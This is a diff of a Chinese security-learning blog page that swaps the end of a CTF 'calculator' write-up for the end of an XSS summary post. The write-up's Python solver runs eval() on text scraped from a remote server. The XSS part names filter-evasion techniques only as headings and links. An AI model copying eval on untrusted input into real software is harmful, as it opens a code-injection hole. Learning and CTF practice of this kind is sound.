-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;官方文档中的解释是，eval()可以将字符串str当成有效的表达式来求值并返回计算结果。globals和locals参数是可选的，如果提供了globals参数，那么它必须是dictionary类型；如果提供了locals参数，那么它可以是任意的map对象。
-</blockquote>
-<p>4.在向服务器提交结果时，如何让服务器知道获得算式的和提交答案的是一个人？</p>
-<blockquote>
-<p>        一开始向服务器发送了请求，并获得了结果，但是在提交答案的时候，服务器怎么知道你是谁？通过查阅资料，引入了<strong>Requests库的Session对象</strong>：session对象能够帮我们跨请求保持某些参数，也会在同一个session实例发出的所有请求之间保持同一个cookies，那么就可以通过相同的cookies让服务器知道获得算式的和提交答案的是一个人。</p>
-</blockquote>
-<h3 id="3-解题过程"><a class="markdownIt-Anchor" href="#3-解题过程"></a> 3. 解题过程</h3>
-<p>有了上述的分析和知识后，现在可以进行编写python脚本解题了。下面直接给出代码：</p>
-<pre class="highlight"><code class="python"><span class="number">1</span>  <span class="keyword">import</span> re 
-<span class="number">2</span>  <span class="keyword">import</span> requests
-<span class="number">3</span>  t = requests.Session()  
-<span class="number">4</span>  url = <span class="string">'http://web1.blue-whale.me:23331/calculator/'</span>
-<span class="number">5</span>  r = t.get(url)
-<span class="number">6</span>  r.encoding = <span class="string">'utf-8'</span>  
-<span class="number">7</span>  print(r.text)
-<span class="number">8</span>  num = re.findall(re.compile(<span class="string">r'&lt;form action="" method="GET"&gt;&lt;span id="exp"&gt;(.*?)\s+=\s+&lt;/span&gt;'</span>), r.text)[<span class="number">0</span>]  
-<span class="number">9</span>  <span class="keyword">print</span> (<span class="string">'result:\n\n%s=%d\n'</span> % (num, eval(num))) 
-<span class="number">10</span> ans=eval(num)
-<span class="number">11</span> flag = t.get(url, params={<span class="string">'answer'</span>:ans})  
-<span class="number">12</span> print(flag.text)  
-</code></pre>
-<blockquote>
-<p><font color="red">1.import re</font>  ##这里是导入python的re模块，因为后面用到了re模块的findall()和compile()；<br>
-<font color="red">2.import requests</font>  ##这里是导入python的requests模块，因为后面用到了requests模块的session()、get()和post()；<br>
-<font color="red">3.t = requests.Session()  </font>  ##生成cookies，为了让服务器知道获得算式的和提交答案的是一个人；<br>
-<font color="red">4.url = ‘<a href="http://web1.blue-whale.me:23331/calculator/" target="_blank" rel="noopener">http://web1.blue-whale.me:23331/calculator/</a>’</font>   ##实验网址，为了以后输入简便直接复制给url对象；<br>
-<font color="red">5.r = t.get(url)</font>   ##通过get获取目的网址，生成一个名为 r 的 Response 对象，我们就可以在这个对象中获取我们想要的信息；<br>
-<font color="red">6.r.encoding = ‘utf-8’ </font>  ##修改编码 ，因为后期要读取 r 响应对象的信息，而我们在目标地址中看到的ContentType：text/html charset=‘UTF-8’，所以编码为“utf-8”<img src="https://wx3.sinaimg.cn/mw690/9b08638bly1g0vsw2nmukj20lt06b0t5.jpg" alt><br>
-<font color="red">7.print(r.text)</font>  ##打印 r 响应对象的文本内容，如下图；<img src="https://wx2.sinaimg.cn/mw690/9b08638bly1g0vsw9bdd0j20hu0d30t1.jpg" alt><br>
-<font color="red">8.num = re.findall(re.compile(r’&lt; form action=&quot;&quot; method=“GET”&gt;&lt; span id=“exp”&gt;(.*?)\s+=\s+&lt; /span&gt;’), r.text)[0] </font><br>
-    ▶ compile括号中的内容：r为转义字符；<br>
-    ▶ ‘ ’中的是提取算术表达式的正则表达式；<br>
-    ▶ (.*?)表示要返回的列表；<br>
-    ▶  \s+表示一个空格；<br>
-<font color="red">9. print (‘result:\n\n%s=%d\n’ % (num, eval(num)))</font>  ##打印结果<img src="https://wx2.sinaimg.cn/mw690/9b08638bly1g0vswmdb53j20bt022gle.jpg" alt><br>
-<font color="red">10.ans=eval(num)</font>  ##将提取的算术公式进行计算的结果赋值给ans变量；<br>
-<font color="red">11. flag = t.get(url, params={‘answer’:ans})</font>  ##因为method被设置为get，所以在这里只能用get的方法进行提交；因为我尝试提交了一下，返回的网页后面的params为answer，所以这里的key值为answer，就被自动被设置为?anwers=ans；<img src="https://wx2.sinaimg.cn/mw690/9b08638bly1g0vsweeegjj20nv06qjrs.jpg" alt><img src="https://wx4.sinaimg.cn/mw690/9b08638bly1g0vswhrom7j20oi06saaq.jpg" alt><br>
-<font color="red">12. print(flag.text)</font> ## 打印返回的网页；<img src="https://wx4.sinaimg.cn/mw690/9b08638bly1g0vswp0xq8j20hh059wef.jpg" alt></p>
-</blockquote>
-<h3 id="4学习感悟"><a class="markdownIt-Anchor" href="#4学习感悟"></a> 4.学习感悟</h3>
-<blockquote>
-<p>     今天的总结，我感觉比我当时做题还难，这也许就是落实的难度大的原因吧！今天又写总结的地方，我感觉缺漏和不足还有很多，以后学习的过程中还得回来不断的更新，慢慢的积累吧！</p>
-</blockquote>
-<h3 id="5每日一句"><a class="markdownIt-Anchor" href="#5每日一句"></a> 5.每日一句</h3>
-<blockquote>
-<p>     只要下定决心，过去的失败，正好是未来行动的借鉴；只要不屈不挠，一时的障碍，正好是推动成功的力量。</p>
-</blockquote>
+<h1 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h1>
+<p>感觉总结的不是很全面，以后会查漏补缺，如果有师傅发现错误之处，还望斧正</p>
+<h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1>
+<p><a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a><br>
+<a href="https://blog.csdn.net/qq_29277155/article/details/51320064" target="_blank" rel="noopener">很全的xss总结</a><br>
+<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://muzibing.github.io">MUZIBing</a>
-            </p><p>原文链接：<a href="https://muzibing.github.io/2019/03/08/2019.03.08（14）/">https://muzibing.github.io/2019/03/08/2019.03.08（14）/</a>
-            </p><p>发表日期：<a href="https://muzibing.github.io/2019/03/08/2019.03.08（14）/">March 8th 2019, 12:00:00 am</a>
-            </p><p>更新日期：<a href="https://muzibing.github.io/2019/03/08/2019.03.08（14）/">April 22nd 2019, 9:54:50 pm</a>
+            </p><p>原文链接：<a href="https://muzibing.github.io/2020/02/23/2020.02.23（94）/">https://muzibing.github.io/2020/02/23/2020.02.23（94）/</a>
+            </p><p>发表日期：<a href="https://muzibing.github.io/2020/02/23/2020.02.23（94）/">February 23rd 2020, 12:00:00 am</a>
+            </p><p>更新日期：<a href="https://muzibing.github.io/2020/02/23/2020.02.23（94）/">February 23rd 2020, 10:50:58 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -526,17 +569,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/03/09/2019.03.09（15）/" title="正则表达式总结（1）">
-                    <div class="nextTitle">正则表达式总结（1）</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/03/07/2019.03.07（13）/" title="Misc：Invisible flag解题总结">
-                    <div class="prevTitle">Misc：Invisible flag解题总结</div>
+                <a href="/2020/02/23/2020.02.23（93）/" title="【转载】文件 HOSTS 的简介和修改方法">
+                    <div class="prevTitle">【转载】文件 HOSTS 的简介和修改方法</div>
                 </a>
             
         </li>
@@ -670,7 +708,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-前期准备"><span class="toc-number">1.</span> <span class="toc-text"> 1. 前期准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-思考过程"><span class="toc-number">2.</span> <span class="toc-text"> 2. 思考过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-解题过程"><span class="toc-number">3.</span> <span class="toc-text"> 3. 解题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4学习感悟"><span class="toc-number">4.</span> <span class="toc-text"> 4.学习感悟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5每日一句"><span class="toc-number">5.</span> <span class="toc-text"> 5.每日一句</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简述"><span class="toc-number">1.</span> <span class="toc-text"> 简述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用的xss攻击手段和目的"><span class="toc-number">2.</span> <span class="toc-text"> 常用的XSS攻击手段和目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分类"><span class="toc-number">3.</span> <span class="toc-text"> 分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反射型"><span class="toc-number">3.1.</span> <span class="toc-text"> 反射型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#存储型"><span class="toc-number">3.2.</span> <span class="toc-text"> 存储型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dom型"><span class="toc-number">3.3.</span> <span class="toc-text"> DOM型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#无任何过滤情况下"><span class="toc-number">4.</span> <span class="toc-text"> 无任何过滤情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一些常见标签"><span class="toc-number">4.1.</span> <span class="toc-text"> 一些常见标签</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用link远程包含js文件"><span class="toc-number">4.1.1.</span> <span class="toc-text"> 利用link远程包含js文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javascript伪协议"><span class="toc-number">4.1.2.</span> <span class="toc-text"> javascript伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它"><span class="toc-number">4.1.3.</span> <span class="toc-text"> 其它</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#有过滤的情况下"><span class="toc-number">5.</span> <span class="toc-text"> 有过滤的情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤空格"><span class="toc-number">5.1.</span> <span class="toc-text"> 过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤关键字"><span class="toc-number">5.2.</span> <span class="toc-text"> 过滤关键字</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写绕过"><span class="toc-number">5.2.1.</span> <span class="toc-text"> 大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#双写关键字"><span class="toc-number">5.2.2.</span> <span class="toc-text"> 双写关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符拼接"><span class="toc-number">5.2.3.</span> <span class="toc-text"> 字符拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它字符混淆"><span class="toc-number">5.2.4.</span> <span class="toc-text"> 其它字符混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编码绕过"><span class="toc-number">5.2.5.</span> <span class="toc-text"> 编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤双引号单引号"><span class="toc-number">5.3.</span> <span class="toc-text"> 过滤双引号，单引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤括号"><span class="toc-number">5.4.</span> <span class="toc-text"> 过滤括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤url地址"><span class="toc-number">5.5.</span> <span class="toc-text"> 过滤url地址</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用url编码"><span class="toc-number">5.5.1.</span> <span class="toc-text"> 使用url编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用ip"><span class="toc-number">5.5.2.</span> <span class="toc-text"> 使用IP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#如何防止xss"><span class="toc-number">6.</span> <span class="toc-text"> 如何防止xss</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后记"><span class="toc-number">7.</span> <span class="toc-text"> 后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reference"><span class="toc-number">8.</span> <span class="toc-text"> Reference</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
